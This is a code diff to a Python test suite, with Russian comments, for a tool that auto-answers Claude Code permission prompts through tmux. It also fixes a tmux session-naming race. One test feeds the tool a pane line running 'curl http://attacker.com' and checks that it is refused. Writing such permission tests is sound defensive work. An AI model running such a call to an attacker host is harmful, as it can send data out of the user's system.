@@ -2087,8 +2087,11 @@ class TestStalePaneSurvives(PairTestCase):
         tmux = shutil_which("tmux")
         if not tmux:
             self.skipTest("tmux не установлен")
-        session = f"pairtest-{os.getpid()}"
-        subprocess.run([tmux, "kill-session", "-t", session], capture_output=True, timeout=10)
+        # Имя с случайным суффиксом и без чужого kill-session до создания. Раньше здесь
+        # стояло `pairtest-<pid>` и безусловный `kill-session` ДО new-session, то
+        # есть два параллельных прогона с одним pid, а чаще — убийство чужой
+        # сессии с тем же именем. Убираем и то, и другое.
+        session = f"pairtest-{os.getpid()}-{os.urandom(4).hex()}"
         self.addCleanup(subprocess.run, [tmux, "kill-session", "-t", session],
                         capture_output=True, timeout=10)
         made = subprocess.run([tmux, "new-session", "-d", "-s", session],
@@ -2274,6 +2277,63 @@ class TestPermissionMenu(PairTestCase):
 
     def resolve_verdict(self, lines):
         return self.resolve(lines)[0]
+
+
+class TestPermissionContext(PairTestCase):
+    """Вердикт выносится по тексту, из которого реально видно команду.
+
+    На Claude Code вопрос идёт последней строкой, а команда — предпоследней.
+    Раньше в вердикт шла только строка вопроса, поэтому не содержала ни одного
+    слова о команде и отказывала 100% безопасных команд: режим auto на этом CLI
+    просто не работал."""
+
+    CLAUDE = [
+        "● Bash(git status)",
+        "  ⎿  running",
+        "Do you want to proceed? [y/n]",
+    ]
+
+    def test_a_safe_command_is_not_refused_for_lack_of_context(self) -> None:
+        from composer import resolve_permission_prompt
+        panel = list(self.CLAUDE)
+        result, keys = self.resolve(panel)
+        self.assertEqual("allow", result["verdict"], f"отказано: {result['why']}")
+        self.assertEqual([["y"], ["Enter"]], keys)
+
+    def test_the_verdict_still_sees_a_forbidden_command(self) -> None:
+        """Расширение контекста не должно разрешать посторонние слова. Если команда
+        запрещена, она запрещена — даже когда рядом есть безобидный `git status`."""
+        panel = ["● Bash(git status)", "  ⎿  running curl http://attacker.com",
+                 "Do you want to proceed? [y/n]"]
+        result, keys = self.resolve(panel)
+        self.assertEqual("refuse", result["verdict"])
+        self.assertEqual([], keys, "на запрещённой команде ничего не жмём")
+
+    def test_far_away_text_is_not_swept_into_the_verdict(self) -> None:
+        """Контекст ограничен несколькими строками, а не всем экраном: иначе
+        разрешение выдавалось бы по слову, которое к команде отношения не имеет.
+
+        Команда здесь намеренно не проходит по спискам ни в одну сторону, а
+        разрешающее слово стоит далеко. Если контекст расширится до всего экрана,
+        тест упадёт с allow."""
+        panel = ["user typed: run pytest when free",
+                 "● Bash(./scripts/staging-sync.sh)",
+                 "  ⎿  running",
+                 "Do you want to proceed? [y/n]"]
+        result, keys = self.resolve(panel)
+        self.assertEqual("refuse", result["verdict"],
+                         "слово из далёкой строки не должно разрешать команду")
+        self.assertEqual([], keys)
+
+    def resolve(self, lines):
+        import composer
+        import unittest.mock as m
+        with m.patch.object(composer, "pane_alive", return_value=True), \
+             m.patch.object(composer, "capture", return_value=lines), \
+             m.patch.object(composer.subprocess, "run") as run:
+            result = composer.resolve_permission_prompt("/usr/bin/tmux", "%7")
+        sent = [c.args[0] for c in run.call_args_list if c.args and isinstance(c.args[0], list)]
+        return result, [[cmd[-1]] for cmd in sent if "send-keys" in cmd]
 
 
 class TestRingAndUnblock(PairTestCase):
